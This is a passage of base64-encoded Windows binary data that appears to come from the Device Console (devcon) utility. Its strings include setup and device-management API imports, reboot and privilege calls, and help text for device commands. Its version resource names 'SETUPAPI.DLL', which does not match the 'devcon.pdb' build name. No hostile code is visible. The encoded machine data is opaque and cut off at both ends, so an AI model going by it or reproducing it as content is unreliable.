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WYWx1ZUV4VwAAFwJPcGVuU0NNYW5hZ2VyVwAAZQBDbG9zZVNlcnZpY2VIYW5kbGUAAEFEVkFQSTMyLmRsbAAAGwJHZXRDdXJyZW50UHJvY2VzcwCrAUZvcm1hdE1lc3NhZ2VXAABjAkdldExhc3RFcnJvcgAAhgBDbG9zZUhhbmRsZQDMA0xvY2FsRnJlZQBuAUZpbGVUaW1lVG9TeXN0ZW1UaW1lAADCA0xvYWRMaWJyYXJ5VwAAsQJHZXRQcm9jQWRkcmVzcwAArwFGcmVlTGlicmFyeQAmAkdldERhdGVGb3JtYXRXAACEAUZpbmRGaXJzdEZpbGVXAABcAkdldEZ1bGxQYXRoTmFtZVcAAJABRmluZE5leHRGaWxlVwB5AUZpbmRDbG9zZQBIAkdldEZpbGVBdHRyaWJ1dGVzVwAAKwNHZXRXaW5kb3dzRGlyZWN0b3J5VwAAS0VSTkVMMzIuZGxsAADrBHRvd2xvd2VyAACKA193Y3NpY21wAABKBGZwdXR3cwAAbwRpc3dhbHBoYQAAAQV3Y3NjaHIAAEgEZnB1dHMAlANfd2NzbmljbXAAEAV3Y3NyY2hyAOwEdG93dXBwZXIAACAFd3ByaW50ZgCGBG1hbGxvYwAAvwBfY2FsbG5ld2gATARmcmVlAABVAF9YY3B0RmlsdGVyAK4AX2Ftc2dfZXhpdAAAnQBfX3dnZXRtYWluYXJncwAAjgBfX3NldF9hcHBfdHlwZQAAMgRleGl0AAAOAV9leGl0AMEAX2NleGl0AACQAF9fc2V0dXNlcm1hdGhlcnIAAH0BX2luaXR0ZXJtAFcAX19DX3NwZWNpZmljX2hhbmRsZXIAACcBX2Ztb2RlAADSAF9jb21tb2RlAABtc3ZjcnQuZGxsAAAvAD90ZXJtaW5hdGVAQFlBWFhaABAAQ0xTSURGcm9tU3RyaW5nAG9sZTMyLmRsbAA9AVNldHVwRGlEZXN0cm95RGV2aWNlSW5mb0xpc3QAACcBU2V0dXBEaUNsYXNzR3VpZHNGcm9tTmFtZUV4VwAAVwBDTV9HZXRfRGV2aWNlX0lEX0V4VwAAUwFTZXR1cERpR2V0Q2xhc3NEZXZzRXhXAABlAVNldHVwRGlHZXREZXZpY2VJbmZvTGlzdERldGFpbFcAMgFTZXR1cERpQ3JlYXRlRGV2aWNlSW5mb0xpc3RFeFcAAEABU2V0dXBEaUVudW1EZXZpY2VJbmZvAHIBU2V0dXBEaUdldERldmljZVJlZ2lzdHJ5UHJvcGVydHlXAJMBU2V0dXBEaU9wZW5EZXZpY2VJbmZvVwAAPQJTZXR1cFNjYW5GaWxlUXVldWVXAE0BU2V0dXBEaUdldENsYXNzRGVzY3JpcHRpb25FeFcABwJTZXR1cE9wZW5GaWxlUXVldWUAAH8AQ01fR2V0X05leHRfUmVzX0Rlc19FeAAAUwBDTV9HZXRfRGV2Tm9kZV9TdGF0dXNfRXgAAAcBU2V0dXBDbG9zZUluZkZpbGUAgwBDTV9HZXRfUmVzX0Rlc19EYXRhX0V4AACRAVNldHVwRGlPcGVuRGV2UmVnS2V5AAA+AVNldHVwRGlEZXN0cm95RHJpdmVySW5mb0xpc3QAAAYBU2V0dXBDbG9zZUZpbGVRdWV1ZQBnAVNldHVwRGlHZXREZXZpY2VJbnN0YWxsUGFyYW1zVwAAQwFTZXR1cERpRW51bURyaXZlckluZm9XAAC2AVNldHVwRGlTZXRTZWxlY3RlZERyaXZlclcAbwBDTV9HZXRfRmlyc3RfTG9nX0NvbmZfRXgAAHQBU2V0dXBEaUdldERyaXZlckluZm9EZXRhaWxXAIUAQ01fR2V0X1Jlc19EZXNfRGF0YV9TaXplX0V4ACEBU2V0dXBEaUJ1aWxkRHJpdmVySW5mb0xpc3QAAOkBU2V0dXBHZXRTdHJpbmdGaWVsZFcAACIBU2V0dXBEaUNhbGxDbGFzc0luc3RhbGxlcgAJAlNldHVwT3BlbkluZkZpbGVXADoAQ01fRnJlZV9SZXNfRGVzX0hhbmRsZQAArAFTZXR1cERpU2V0RGV2aWNlSW5zdGFsbFBhcmFtc1cAAL8BU2V0dXBGaW5kRmlyc3RMaW5lVwA2AENNX0ZyZWVfTG9nX0NvbmZfSGFuZGxlAJABU2V0dXBEaU9wZW5DbGFzc1JlZ0tleUV4VwB2AVNldHVwRGlHZXREcml2ZXJJbnN0YWxsUGFyYW1zVwAAMwFTZXR1cERpQ3JlYXRlRGV2aWNlSW5mb1cAACABU2V0dXBEaUJ1aWxkQ2xhc3NJbmZvTGlzdEV4VwAAsQFTZXR1cERpU2V0RGV2aWNlUmVnaXN0cnlQcm9wZXJ0eVcAtgBDTV9SZWVudW1lcmF0ZV9EZXZOb2RlX0V4ACcAQ01fRGlzY29ubmVjdF9NYWNoaW5lAJkAQ01fTG9jYXRlX0Rldk5vZGVfRXhXAKYBU2V0dXBEaVNldENsYXNzSW5zdGFsbFBhcmFtc1cAEgBDTV9Db25uZWN0X01hY2hpbmVXAH8BU2V0dXBEaUdldElORkNsYXNzVwAwAVNldHVwRGlDcmVhdGVEZXZpY2VJbmZvTGlzdAARAVNldHVwQ29weU9FTUluZlcAACsBU2V0dXBEaUNsYXNzTmFtZUZyb21HdWlkRXhXAFNFVFVQQVBJLmRsbAAAMwBDaGFyTmV4dFcANgBDaGFyUHJldlcAYQJMb2FkU3RyaW5nVwBVU0VSMzIuZGxsAACDBVNsZWVwAMsEUnRsQ2FwdHVyZUNvbnRleHQA0gRSdGxMb29rdXBGdW5jdGlvbkVudHJ5AADZBFJ0bFZpcnR1YWxVbndpbmQAALQFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABzBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgCSBVRlcm1pbmF0ZVByb2Nlc3MAAHoCR2V0TW9kdWxlSGFuZGxlVwAASQRRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgAcAkdldEN1cnJlbnRQcm9jZXNzSWQAIAJHZXRDdXJyZW50VGhyZWFkSWQAAOwCR2V0U3lzdGVtVGltZUFzRmlsZVRpbWUACgNHZXRUaWNrQ291bnQAAIEAX19pb2JfZnVuYwAAlgRtZW1zZXQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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vAHIAIABtAG8AcgBlACAAaQBuAGYAbwByAG0AYQB0AGkAbwBuACwAIAB0AHkAcABlADoAIAAlADEAIABoAGUAbABwAA0ACgAAAAAAIAABACUAMQAgAGYAYQBpAGwAZQBkAC4ADQAKAAAAAACIAAEAJQAxADoAIABJAG4AdgBhAGwAaQBkACAAdQBzAGUAIABvAGYAIAAlADIALgANAAoARgBvAHIAIABtAG8AcgBlACAAaQBuAGYAbwByAG0AYQB0AGkAbwBuACwAIAB0AHkAcABlADoAIAAlADEAIABoAGUAbABwACAAJQAyAA0ACgAAAAAA9AIBAEQAZQB2AGkAYwBlACAAQwBvAG4AcwBvAGwAZQAgAEgAZQBsAHAAOgANAAoAJQAxACAAWwAtAHIAXQAgAFsALQBtADoAXABcADwAbQBhAGMAaABpAG4AZQA+AF0AIAA8AGMAbwBtAG0AYQBuAGQAPgAgAFsAPABhAHIAZwA+AC4ALgAuAF0ADQAKAC0AcgAgACAAIAAgACAAIAAgACAAIAAgACAAUgBlAGIAbwBvAHQAcwAgAHQAaABlACAAcwB5AHMAdABlAG0AIABvAG4AbAB5ACAAdwBoAGUAbgAgAGEAIAByAGUAcwB0AGEAcgB0ACAAbwByACAAcgBlAGIAbwBvAHQAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQALgANAAoAPABtAGEAYwBoAGkAbgBlAD4AIAAgACAAIABTAHAAZQBjAGkAZgBpAGUAcwAgAGEAIAByAGUAbQBvAHQAZQAgAGMAbwBtAHAAdQB0AGUAcgAuACAADQAKADwAYwBvAG0AbQBhAG4AZAA+ACAAIAAgACAAUwBwAGUAYwBpAGYAaQBlAHMAIABhACAARABlAHYAYwBvAG4AIABjAG8AbQBtAGEAbgBkACAAKABzAGUAZQAgAGMAbwBtAG0AYQBuAGQAIABsAGkAcwB0ACAAYgBlAGwAbwB3ACkALgANAAoAPABhAHIAZwA+AC4ALgAuACAAIAAgACAAIABPAG4AZQAgAG8AcgAgAG0AbwByAGUAIABhAHIAZwB1AG0AZQBuAHQAcwAgAHQAaABhAHQAIABtAG8AZABpAGYAeQAgAGEAIABjAG8AbQBtAGEAbgBkAC4ADQAKAEYAbwByACAAaABlAGwAcAAgAHcAaQB0AGgAIABhACAAcwBwAGUAYwBpAGYAaQBjACAAYwBvAG0AbQBhAG4AZAAsACAAdAB5AHAAZQA6ACAAJQAxACAAaABlAGwAcAAgADwAYwBvAG0AbQBhAG4AZAA+AA0ACgAAAAAARAABACUAMQAhAC0AMgAwAHMAIQAgAEQAaQBzAHAAbABhAHkAIABEAGUAdgBjAG8AbgAgAGgAZQBsAHAALgANAAoAAAAsAAEAVQBuAGsAbgBvAHcAbgAgAGMAbwBtAG0AYQBuAGQALgANAAoAAAAAADQCAQBEAGUAdgBjAG8AbgAgAEMAbABhAHMAcwBlAHMAIABDAG8AbQBtAGEAbgBkAA0ACgBMAGkAcwB0AHMAIABhAGwAbAAgAGQAZQB2AGkAYwBlACAAcwBlAHQAdQBwACAAYwBsAGEAcwBzAGUAcwAuACAAVgBhAGwAaQBkACAAbwBuACAAbABvAGMAYQBsACAAYQBuAGQAIAByAGUAbQBvAHQAZQAgAGMAbwBtAHAAdQB0AGUAcgBzAC4ADQAKACUAMQAgAFsALQBtADoAXABcADwAbQBhAGMAaABpAG4AZQA+AF0AIAAlADIADQAKADwAbQBhAGMAaABpAG4AZQA+ACAAIAAgACAAUwBwAGUAYwBpAGYAaQBlAHMAIABhACAAcgBlAG0AbwB0AGUAIABjAG8AbQBwAHUAdABlAHIALgANAAoAQwBsAGEAcwBzACAAZQBuAHQAcgBpAGUAcwAgAGgAYQB2AGUAIAB0AGgAZQAgAGYAbwByAG0AYQB0ACAAPABuAGEAbQBlAD4AOgAgADwAZABlAHMAYwByAD4ADQAKAHcAaABlAHIAZQAgADwAbgBhAG0AZQA+ACAAaQBzACAAdABoAGUAIABjAGwAYQBzAHMAIABuAGEAbQBlACAAYQBuAGQAIAA8AGQAZQBzAGMAcgA+ACAAaQBzACAAdABoAGUAIABjAGwAYQBzAHMAIABkAGUAcwBjAHIAaQBwAHQAaQBvAG4ALgANAAoAAAAAAFgAAQAlADEAIQAtADIAMABzACEAIABMAGkAcwB0ACAAYQBsAGwAIABkAGUAdgBpAGMAZQAgAHMAZQB0AHUAcAAgAGMAbABhAHMAcwBlAHMALgANAAoAAABQAAEATABpAHMAdABpAG4AZwAgACUAMQAhAHUAIQAgAHMAZQB0AHUAcAAgAGMAbABhAHMAcwBlAHMAIABvAG4AIAAlADIALgANAAoAAAAAAEQAAQBMAGkAcwB0AGkAbgBnACAAJQAxACEAdQAhACAAcwBlAHQAdQBwACAAYwBsAGEAcwBzAGUAcwAuAA0ACgAAAAAAGAMBAEQAZQB2AGMAbwBuACAATABpAHMAdABjAGwAYQBzAHMAIABDAG8